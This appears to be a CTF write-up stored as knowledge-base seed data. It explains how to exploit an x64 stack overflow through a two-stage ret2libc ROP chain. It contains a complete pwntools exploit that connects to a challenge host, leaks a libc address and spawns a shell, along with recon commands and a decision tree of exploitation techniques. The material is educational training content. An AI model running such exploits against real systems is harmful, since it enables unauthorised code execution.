# [Seed] CTF Pwn — x64 stack overflow + ROP chain call system

## Scene classification
CTF/binary exploit

## Goal overview
A 64-bit ELF with a `read()` out-of-bounds write to the stack buffer. This machine has NX (non-executable stack) but no PIE and no stack canary. Use ROP gadget to call libc's `system("/bin/sh")` to get the shell.

## Complete execution link

1. basic reconnaissance
   ```bash
   file vuln          # ELF 64-bit, dynamically linked, not stripped
   checksec vuln      # NX enabled, No PIE, No Canary, Partial RELRO
   strings vuln | grep -i 'flag\|/bin/sh\|system'
   ```
2. Use IDA / Ghidra to look at main → found `read(0, buf, 0x100)` but `buf` is only 0x40 bytes
3. Calculate overflow offset
   ```bash
   pwndbg> cyclic 200
   # Enter into the target program and look at RSP after crash
   pwndbg> cyclic -l 0x6161616c
   # offset = 72
   ```
4. Since there is no PIE, PLT and GOT are both fixed addresses.
5. Phase 1 (no libc information): leaking `puts@GOT` contents as libc base
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI)
   payload += p64(elf.got['puts'])
   payload += p64(elf.plt['puts'])
   payload += p64(elf.symbols['main'])     # Return to main for secondary use
   ```
6. Receive puts output and locate the libc version (query with libc-database)
7. The second stage: constructing system("/bin/sh")
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
   payload += p64(libc_base + libc.symbols['system'])
   ```
8. take shell → cat flag

## Trampling on pit records

| Problem | Cause | Solution | Time consuming |
|------|------|---------|------|
| After ROP calls system, the program crashes and there is no shell | The stack is not aligned to 16 bytes (Ubuntu 18.04+ is strict with movaps) | Add a ret gadget before system for padding | 30min |
| Can be connected locally, but not remotely | The libc version is inconsistent | Use puts to leak a function address → Check the exact version on libc-database | 40min |
| pwntools recv stuck | The program output uses setbuf(NULL) but the remote stderr buffer is not closed | Use sendlineafter / recvuntil for precise synchronization | 15min |
| SIGPIPE as soon as the remote is hit | The second stage payload is still using the io object from the previous round | After using `process` / `remote`, io must reuse the same connection. If the main process dies, it will be over | 20min |
| ROPgadget outputs too much | The tool lists all gadgets by default | `ROPgadget --binary vuln --only "pop\|ret"` Filtering | 5min |

## Toolchain discovery

- **pwntools** is the de facto standard for writing exploits in Python (`from pwn import *`)
- **pwndbg** is 10 times more powerful than what comes with GDB (with cyclic / vmmap / heap commands)
- **ROPgadget** vs **ropper**: ropper output is more friendly and supports searching for syscall chain
- **libc-database** Matches exact libc version via leaked 1 libc function address
- **one_gadget** Find a libc gadget that can directly execve("/bin/sh"), which is shorter than manual ROP

## Key code/command

Full exploit template:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

POP_RDI = 0x401243   # ROPgadget --binary vuln | grep "pop rdi"
RET     = 0x40101a   # for stack alignment

def exp():
    io = remote('chal.example.com', 31337)
    # io = process('./vuln')

    # Stage 1: leak puts@GOT
    payload  = b'A' * 72
    payload += p64(POP_RDI) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])

    io.sendlineafter(b'> ', payload)
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base = {hex(libc.address)}')

    # Stage 2: system('/bin/sh')
    bin_sh = next(libc.search(b'/bin/sh'))
    payload  = b'A' * 72
    payload += p64(RET)             # 16-byte stack alignment
    payload += p64(POP_RDI) + p64(bin_sh)
    payload += p64(libc.symbols['system'])

    io.sendlineafter(b'> ', payload)
    io.interactive()

if __name__ == '__main__':
    exp()
```

## Suggestions for improvements to this package

- CTF-Sandbox-Orchestrator's `competition-reverse-pwn` should add `pwn-rop-cheatsheet.md` to make this process a template
- bootstrap manifest added to pwntools/pwndbg/one_gadget

## Reusable patterns/script snippets

**ROP utilizes decision trees**:

```text
checksec → see protection
├── No NX → Shellcode is typed directly (ancient practice)
├── NX + no PIE → ret2libc classic
├── NX + PIE + No Canary → Leak the PIE base address first → ret2libc
├── There is Canary → First find a way to leak Canary (formatted string / off-by-one)
└── Full RELRO + Canary + PIE → Very difficult, common method: fork, not heavy ASLR / __libc_start_main / SROP
```

**libc leak → exploits standard two-stage payload**:

```text
Stage 1: leak puts@GOT → calculate libc base → return to main
Stage 2: pop rdi; "/bin/sh"; ret; system
```

## evolution action
- [ ] CTF orchestrator adds pwn quick reference page
- [ ] bootstrap-manifest added to pwntools/pwndbg/one_gadget
- [ ] reverse-engineering/tools-dynamic.md refers to this case

## environmental information
- Kali 2026.x / Ubuntu 22.04
- pwntools 4.x, pwndbg latest, ROPgadget 7.x
- libc version: glibc 2.31 / 2.35 (CTF common)
- Target architecture: x86_64

## redaction requirements
This entry is seed data, written based on the public CTF technology model, and does not involve any real competition questions or closed source systems.
